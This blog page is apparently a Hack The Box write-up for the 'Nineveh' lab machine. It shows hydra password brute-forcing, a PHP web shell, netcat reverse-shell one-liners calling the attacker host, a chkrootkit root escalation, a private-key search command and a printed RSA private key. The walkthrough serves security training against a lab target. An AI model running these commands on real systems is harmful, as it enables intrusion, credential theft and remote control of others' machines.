<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Nineveh - DiegoExploit
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-P385GSF');</script>
<!-- End Google Tag Manager -->
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>DiegoExploit</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>

</ul>
<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>

</ul>




</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <br>
  <h1 id="Hack-The-Box-Nineveh"><a href="#Hack-The-Box-Nineveh" class="headerlink" title="Hack The Box - Nineveh"></a>Hack The Box - Nineveh</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Nineveh is not overly challenging, however several exploits must be chained to gain initial access. Several uncommon services are running on the machine, and some research is required to enumerate them. Its IP address is <code>10.10.10.43</code> Letâ€™s go to hack!!!<br><img src="/images/hackthebox/exploit/nineveh/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
<p>As always we will start with <code>nmap</code> to scan for open ports and services:

<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/nineveh)
 |
 |-->{SFire129}#nmap -sC -sV 10.10.10.43
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-03 13:13 EDT
 Nmap scan report for 10.10.10.43
 Host is up (0.096s latency).
 Not shown: 998 filtered ports
 PORT    STATE SERVICE  VERSION
 80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html).
 443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html).
 | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
 | Not valid before: 2017-07-01T15:03:30
 |_Not valid after:  2018-07-01T15:03:30
 |_ssl-date: TLS randomness does not represent time
 | tls-alpn:
 |_  http/1.1
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 27.09 seconds<br></figure></pre>
 <p>The output show the http service on port 80 and 443, with the gobuster, enumerate some folders.
 <h2 id="Enumerate"><a href="#Enumerate" class="Enumerate" title="Enumerate"></a>Enumerate</h2>
 <img src="/images/hackthebox/exploit/nineveh/1.png" alt=""></p>
 <p>In the web browser look the directories.
 <img src="/images/hackthebox/exploit/nineveh/2.png" alt=""></p>
 <img src="/images/hackthebox/exploit/nineveh/3.png" alt=""></p>
  <p>In the certificate SSL show the user admin@nineveh.htb
 <img src="/images/hackthebox/exploit/nineveh/4.png" alt=""></p>
 <p>With hydra, run a brute force attack on /department login. NOTE: This section <code> username=^USER^&password=^PASS^ </code>is captured with burpsuite proxy.
 <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/nineveh)
 |
 |-->{SFire129}#hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-03 13:52:38
 [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
 [DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=^USER^&password=^PASS^:Invalid
 [80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-03 13:53:28<br></figure></pre>
 <p>The password admin is <code>1q2w3e4r5t</code>
  <img src="/images/hackthebox/exploit/nineveh/5.png" alt=""></p>
 <p>With hydra, run a brute force attack on /db phplite login. NOTE: This section <code>^PASS^&remember=yes&login=Log+In&proc_login=true</code> is captured with burpsuite proxy.
  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/nineveh)
 |
 |-->{SFire129}#hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form
  "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect"  -t 64
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-03 14:33:01
 [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
 [DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect
 [443][http-post-form] host: 10.10.10.43   login: none   password: password123
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-03 14:33:32<br></figure></pre>
 <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
  <p>The password database is <code>password123</code>
 <img src="/images/hackthebox/exploit/nineveh/6.png" alt=""></p>
 <p>Create the database, in my case with the name Diego, with one row.
 <img src="/images/hackthebox/exploit/nineveh/7.png" alt=""></p>
 <p>In the field row, put <code>?php echo system($_REQUEST["ipp"]); ? </code> for web shell.
 <img src="/images/hackthebox/exploit/nineveh/8.png" alt=""></p>
 <p>Rename the file created to ninevehNotes.php. 
 <img src="/images/hackthebox/exploit/nineveh/9.png" alt=""></p>
<p>From URL, add <code>&ipp=ls</code> look the output and send to repeater in in burpsuite.
 <img src="/images/hackthebox/exploit/nineveh/12.png" alt=""></p>
 <img src="/images/hackthebox/exploit/nineveh/13.png" alt=""></p>
  <p>Execute command <code>locate nc</code> to find netcat in the system, remember to press <code>CTRL + U</code> for become in URL the command.
 <img src="/images/hackthebox/exploit/nineveh/14.png" alt=""></p>
 <p>With the script <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 4445 >/tmp/f</code> send as URL with own IP address Kali and run netcat listener over port 4445
 <img src="/images/hackthebox/exploit/nineveh/15.png" alt=""></p>
 <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/nineveh)
 |
 |-->{SFire129}#nc -nvlp 4445
 listening on [any] 4445 ...
 connect to [10.10.14.27] from (UNKNOWN) [10.10.10.43] 38478
 /bin/sh: 0: can't access tty; job control turned off
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ SHELL=/bin/bash script -q /dev/null
 www-data@nineveh:/var/www/html/department$<br></figure></pre>
 <p>From Kali Linux with simple http server, download the <code>LinEnum.sh</code> for enumerate the system.
  <pre><figure class="highlight plain"> www-data@nineveh:/tmp$ curl 10.10.14.27:88/LinEnum.sh -o linenum.sh
 curl 10.10.14.27:88/LinEnum.sh -o linenum.sh
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 46631  100 46631    0     0   118k      0 --:--:-- --:--:-- --:--:--  118k
 www-data@nineveh:/tmp$ ls
 ls
 f
 linenum.sh
 systemd-private-579085a8383b4b7c981b72210a517868-systemd-timesyncd.service-ZsqDUH
 vmware-root
 www-data@nineveh:/tmp$ ls -la
 ls -la
 total 84
 drwxrwxrwt  9 root     root      4096 Jun  3 16:15 .
 drwxr-xr-x 24 root     root      4096 Jul  2  2017 ..
 drwxrwxrwt  2 root     root      4096 Jun  3 11:12 .ICE-unix
 drwxrwxrwt  2 root     root      4096 Jun  3 11:12 .Test-unix
 drwxrwxrwt  2 root     root      4096 Jun  3 11:12 .X11-unix
 drwxrwxrwt  2 root     root      4096 Jun  3 11:12 .XIM-unix
 drwxrwxrwt  2 root     root      4096 Jun  3 11:12 .font-unix
 prw-r--r--  1 www-data www-data     0 Jun  3 16:15 f
 -rw-r--r--  1 www-data www-data 46631 Jun  3 16:15 linenum.sh
 drwx------  3 root     root      4096 Jun  3 11:12 systemd-private-579085a8383b4b7c981b72210a517868-systemd-timesyncd.service-ZsqDUH
 drwx------  2 root     root      4096 Jun  3 11:12 vmware-root <br></figure></pre>
 <p>The enumeration not show sensible information, only normally configuration but, show the <code>knockd</code> service that which is very important.
 <img src="/images/hackthebox/exploit/nineveh/16.png" alt=""></p>
 <p>Listing the root folder, found the folder /report, this folder by generally is a rootkit vulnerability.
 <pre><figure class="highlight plain"> www-data@nineveh:/$ ls
 ls
 bin   etc         lib         media  proc    run   srv  usr
 boot  home        lib64       mnt    report  sbin  sys  var
 dev   initrd.img  lost+found  opt    root    snap  tmp  vmlinuz
 www-data@nineveh:/$ ls /report
 ls /report
 report-20-06-04:16:40.txt  report-20-06-04:16:43.txt  report-20-06-04:16:46.txt
 report-20-06-04:16:41.txt  report-20-06-04:16:44.txt
 report-20-06-04:16:42.txt  report-20-06-04:16:45.txt <br></figure></pre>
 <p>with <code>cat</code>command review whichever file inside the report folder. The output looks like  a rootkit vulnerability.
 <img src="/images/hackthebox/exploit/nineveh/21.png" alt=""></p>
 <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get-Privileges"></a>Get Privileges</h2>
 <p>For go ahead in the server, we will need to get a ssh connection, with the command <code> find / -xdev -type f -print0 | xargs -0 grep -H "BEGIN RSA PRIVATE KEY"</code> could be find any private key in the server.
 <img src="/images/hackthebox/exploit/nineveh/17.png" alt=""></p>
 <p>The output show a png file in /var/www/ssl/secure_notes folder location, which looks like a steganography file.
 <img src="/images/hackthebox/exploit/nineveh/18.png" alt=""></p>
 <p>Extract the file hidden.
  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/nineveh)
 |
 |-->{SFire129}#binwalk -e /home/kali/nineveh.png
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
 0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
 84            0x54            Zlib compressed data, best compression
 2881744       0x2BF8D0        POSIX tar archive (GNU)
 |-------(root@kali)-------|(~/HackTheBox/nineveh)
 |
 |-->{SFire129}#ls
 _nineveh.png.extracted
 |-------(root@kali)-------|(~/HackTheBox/nineveh)
 |
 |-->{SFire129}#cd _nineveh.png.extracted/
 |-------(root@kali)-------|(~/HackTheBox/nineveh/_nineveh.png.extracted)
 |
 |-->{SFire129}#ls
 2BF8D0.tar  54  54.zlib  secret
 |-------(root@kali)-------|(~/HackTheBox/nineveh/_nineveh.png.extracted)
 |
 |-->{SFire129}#cd secret/
 |-------(root@kali)-------|(~/HackTheBox/nineveh/_nineveh.png.extracted/secret)
 |
 |-->{SFire129}#ls
 nineveh.priv  nineveh.pub
 |-------(root@kali)-------|(~/HackTheBox/nineveh/_nineveh.png.extracted/secret)
 |
 |-->{SFire129}#cat nineveh.p
 cat: nineveh.p: No such file or directory
 |-------(root@kali)-------|(~/HackTheBox/nineveh/_nineveh.png.extracted/secret)
 |
 |-->{SFire129}#cat nineveh.priv
 -----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
 H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
 PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
 FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
 3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
 X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
 KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
 FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
 GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
 JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
 9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
 Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
 ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
 1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
 vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
 DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
 P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
 fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
 tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
 iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
 MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
 PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
 i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
 il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
 fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
 -----END RSA PRIVATE KEY----- <br></figure></pre>
 <p>The service Knockd is used for security in differents ports, we need to know the configuration about it to connect, the configuration file is knockd.conf.
 <img src="/images/hackthebox/exploit/nineveh/19.png" alt=""></p>
 <p>Now, to open ssh port, we need to knock, knock, knock in the 3 ports 
  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/nineveh/_nineveh.png.extracted/secret)
 |
 |-->{SFire129}#for i in 571 290 911; do
 > nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.10.43 >/dev/null
 > done; ssh -i nineveh.priv amrois@10.10.10.43
 The authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.
 ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.10.43' (ECDSA) to the list of known hosts.
 Ubuntu 16.04.2 LTS
 Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 
 133 packages can be updated.
 66 updates are security updates.
 
 
 You have mail.
 Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14<br></figure></pre>
 <p>Connected to ssh server.
 <p>Search exploit for rootkit
   <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/nineveh)
 |
 |-->{SFire129}#searchsploit chkrootkit
 ----------------------------------------------- ----------------------------------------
  Exploit Title                                 |  Path
                                                | (/usr/share/exploitdb/)
 ----------------------------------------------- ----------------------------------------
 Chkrootkit - Local Privilege Escalation (Metas | exploits/linux/local/38775.rb
 Chkrootkit 0.49 - Local Privilege Escalation   | exploits/linux/local/33899.txt
 ----------------------------------------------- ----------------------------------------
 Shellcodes: No Result<br></figure></pre>
<p>The vulnerability talk about file created in /tmp/ location with name <code>update</code>, this file can run with privileges root.
<p>Then, create a file update in location /tmp with reverse code netcat <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 1234 >/tmp/f</code> and wait reverse connection with nc listener over port 1234, meanwhile, with <a class="vglnk"https://github.com/diegoexploit/pspy"rel="nofollow"><span>pspy64</span></a> downloaded from simple http Kali, you could view the activity in the server like a crontab.
<img src="/images/hackthebox/exploit/nineveh/19.png" alt=""></p>
<p>Reverse connection root
<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/nineveh)
 |
 |-->{SFire129}#nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.27] from (UNKNOWN) [10.10.10.43] 37286
 /bin/sh: 0: can't access tty; job control turned off
 # /bin/sh: 1: : not found
 # python3 -c 'import pty; pty.spawn("/bin/bash")'
 root@nineveh:~# pwd
 pwd
 /root</figure></pre>

<h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>

<pre><figure class="highlight plain"> root@nineveh:~# cd /home
 root@nineveh:/home# ls
 amrois
 root@nineveh:/home# cd amrois
 root@nineveh:/home/amrois# cat user.txt
 ***Here you could be find the user flag***
 root@nineveh:/home/amrois# cat /root/root.txt
 ***Here you could be find the root flag***
 root@nineveh:/home/amrois#</figure></pre>

 
<p> And we owned root !</p>
</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.png" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>DiegoExploit</div>
      <div>2020-06-04</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#Eternalnineveh</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
